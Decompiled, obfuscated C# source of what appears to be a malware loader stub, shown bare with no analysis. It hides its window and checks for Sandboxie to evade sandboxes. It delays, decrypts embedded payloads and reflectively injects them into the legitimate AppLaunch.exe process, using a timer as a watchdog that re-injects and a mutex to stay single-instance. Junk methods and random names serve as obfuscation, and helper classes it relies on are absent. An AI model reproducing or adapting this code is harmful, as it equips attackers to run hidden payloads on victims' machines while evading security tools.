using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using qmbvlcqBjjWJkGThPgSW;

public class uVgasbyisyuHXmtvFcXB : Form
{
	public delegate object PFkstrwibiNZYosvmMbU();

	public delegate byte[] EloJlpEOjwjWwTSuctfj(string data);

	public delegate object JjuoHEawVNJVmBWKTqlP();

	public delegate object RxSXfVBKKINkrydppFJM(object S);

	public delegate OpCode EcrkUCFZCGURzNmmOWiL(string s);

	[AccessedThroughProperty("Timer1")]
	private Timer zfDVuVgasbyisyuHXmtv;

	public static int FcXBDjpJRHmhhglWdkBb = 0;

	public static bool bqgjbzdIGncwnerClkYY = true;

	public static int yIUwQvTlxljdvsPyJPLX = 0;

	public static byte[] opLMVsaETzGZhXDxywCm;

	public static byte[] fmRrdtxzrRtYJEsNEuIT;

	public static byte[] CBoaCYkygxjnOCztMJfC;

	public StringBuilder afcnqGbclvqUjDWpkZFO;

	private string PNSDvDhutKOQIhwoZHJd;

	private string GLZjERFrSonPwOBFeFQK;

	public static string cZvSqieqHWrfoMHkmTms = "0";

	public static object BpVefdiGNUxLKaegYxNF;

	internal static EloJlpEOjwjWwTSuctfj pXZuXbplUiIIirEgzfDV = (EloJlpEOjwjWwTSuctfj)Delegate.CreateDelegate(typeof(EloJlpEOjwjWwTSuctfj), (MethodInfo)uMxCbQNHZWtPntpCFToq.aw98());

	public virtual _003F Timer_0
	{
		get
		{
			return zfDVuVgasbyisyuHXmtv;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (zfDVuVgasbyisyuHXmtv != null)
			{
				zfDVuVgasbyisyuHXmtv.remove_Tick((EventHandler)Timer1_Tick);
			}
			zfDVuVgasbyisyuHXmtv = value;
			if (zfDVuVgasbyisyuHXmtv != null)
			{
				zfDVuVgasbyisyuHXmtv.add_Tick((EventHandler)Timer1_Tick);
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new uVgasbyisyuHXmtvFcXB());
	}

	public uVgasbyisyuHXmtvFcXB()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)uVgasbyisyuHXmtvFcXB_Load);
		Timer_0 = new Timer();
		afcnqGbclvqUjDWpkZFO = new StringBuilder();
		PNSDvDhutKOQIhwoZHJd = "FhY";
		GLZjERFrSonPwOBFeFQK = "2";
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
	}

	public static object trimmit(string data, int key)
	{
		checked
		{
			key++;
			return data.Substring(0, data.Length - key);
		}
	}

	private void uVgasbyisyuHXmtvFcXB_Load(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			string text = process.ProcessName.ToLower();
			if (Operators.CompareString(text, "sandboxierpcss", false) == 0 && Process.GetCurrentProcess().SessionId == process.SessionId)
			{
				Environment.Exit(0);
			}
		}
		Thread.Sleep(10000);
		CBoaCYkygxjnOCztMJfC = (byte[])smethod_1(method_0(RuntimeHelpers.GetObjectValue(YWbyFMqEDTXZRqGxiQSm.smethod_3()), "1"));
		opLMVsaETzGZhXDxywCm = (byte[])smethod_1(method_0(RuntimeHelpers.GetObjectValue(WbYjmCXYhrmQfySlgVBK.smethod_0()), GLZjERFrSonPwOBFeFQK));
		fmRrdtxzrRtYJEsNEuIT = (byte[])smethod_1(YWbyFMqEDTXZRqGxiQSm.smethod_1(Conversions.ToString(hvEFPmhLMszSaQvqrpug.smethod_0()), "øûÑñÈâÑàÇï"));
		DTA9(new object[1] { string.Empty });
		lkwkw();
		if (!File.Exists(((ServerComputer)cThraaNNowKlGkJambYS.unknown_0).get_FileSystem().get_SpecialDirectories().get_Temp() + "%bndertp%"))
		{
			try
			{
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		((Timer)Timer_0).set_Interval(10);
		((Timer)Timer_0).Start();
	}

	public static void smethod_0()
	{
	}

	public void lkwkw()
	{
		int num = 0;
		while (!Conversions.ToBoolean(smethod_2(fmRrdtxzrRtYJEsNEuIT, new object[3]
		{
			RuntimeEnvironment.GetRuntimeDirectory() + method_0("]BqqMbvodi/fyf", 1),
			string.Empty,
			opLMVsaETzGZhXDxywCm
		}, "吾马比めやきめ", "克比艾吾Éみ")))
		{
			num = checked(num + 1);
			if (num > 5)
			{
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		int num = 0;
		Process[] processes = Process.GetProcesses();
		checked
		{
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, Path.GetFileNameWithoutExtension("AppLaunch.exe"), false) == 0)
				{
					num++;
					if (bqgjbzdIGncwnerClkYY)
					{
						FcXBDjpJRHmhhglWdkBb++;
						bqgjbzdIGncwnerClkYY = false;
					}
				}
			}
			if (num != FcXBDjpJRHmhhglWdkBb)
			{
				FcXBDjpJRHmhhglWdkBb = 0;
				num = 0;
				bqgjbzdIGncwnerClkYY = false;
				lkwkw();
				Process[] processes2 = Process.GetProcesses();
				foreach (Process process2 in processes2)
				{
					if (Operators.CompareString(process2.ProcessName, Path.GetFileNameWithoutExtension("AppLaunch.exe"), false) == 0)
					{
						FcXBDjpJRHmhhglWdkBb++;
						num++;
					}
				}
			}
			if (num == 0)
			{
				FcXBDjpJRHmhhglWdkBb = 0;
				num = 0;
				bqgjbzdIGncwnerClkYY = false;
				lkwkw();
				bqgjbzdIGncwnerClkYY = true;
			}
			Mutex mutex = new Mutex(initiallyOwned: false, "12111189adwadawdDaTLY");
			if (!mutex.WaitOne(0, exitContext: false))
			{
				ProjectData.EndApp();
			}
		}
	}

	public static object smethod_1(string string_0)
	{
		return pXZuXbplUiIIirEgzfDV(string_0);
	}

	public static object smethod_2(byte[] byte_0, object[] object_0, string string_0, string string_1)
	{
		return DrXTTRWIOVmNMcSVNlPt.eNjTekgrJYfgqOJmoVbu.InvokeMember("克比艾吾Éみ", BindingFlags.InvokeMethod, null, null, object_0);
	}

	public static object DTA9(object object_0)
	{
		object obj = YWbyFMqEDTXZRqGxiQSm.smethod_0();
		object[] array = new object[5]
		{
			"克比艾吾Éみ",
			BindingFlags.InvokeMethod,
			null,
			null,
			RuntimeHelpers.GetObjectValue(object_0)
		};
		bool[] array2 = new bool[5] { false, false, false, false, true };
		object result = NewLateBinding.LateGet(obj, (Type)null, "InvokeMember", array, (string[])null, (Type[])null, array2);
		if (array2[4])
		{
			object_0 = RuntimeHelpers.GetObjectValue(array[4]);
			return result;
		}
		return result;
	}

	public string method_0(object object_0, object object_1)
	{
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2 = new StringBuilder();
		stringBuilder2.Append(RuntimeHelpers.GetObjectValue(object_0));
		int num = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(object_0, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1));
		for (int i = 0; i <= num; i = checked(i + 1))
		{
			object obj = Convert.ToInt32(stringBuilder2[i]);
			object obj2 = Conversions.ToInteger(Operators.SubtractObject(obj, (object)Conversions.ToDouble(object_1)));
			char value = Convert.ToChar(RuntimeHelpers.GetObjectValue(obj2));
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	static void DjpJRHmhhglWdkBbbqgj()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void DcFjhPEYPGTdNMzzbjvY()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void rXuNZNLFXUqalqnyQRmn()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wVCfubhBJyeZaYdOHOsT()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void FVZbTsVzkfUofWjudcQC()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void dzMaIZMQpdbVnkHdCHEP()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ShDENXSvLexRMBgpqote()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void YfJWVlprjJYQBikGimBL()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ftgTtQPrYpcgGgrlEBXt()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void SKGSixTHQniMOuPUcSxG()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void srwTahMZYorumLaTDlnI()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void kpDzivVVwFStNsRiJito()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void GpMvHNJUlzIJTqlPQwEW()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void eUzuvtykqxPpoFuxoOqW()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void UCqLBrGQyyllNViKeJhy()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void LzwqJGcMXdZkCDYajHnR()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void hOUnvkQMMLPBtBfGrHLO()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}
}
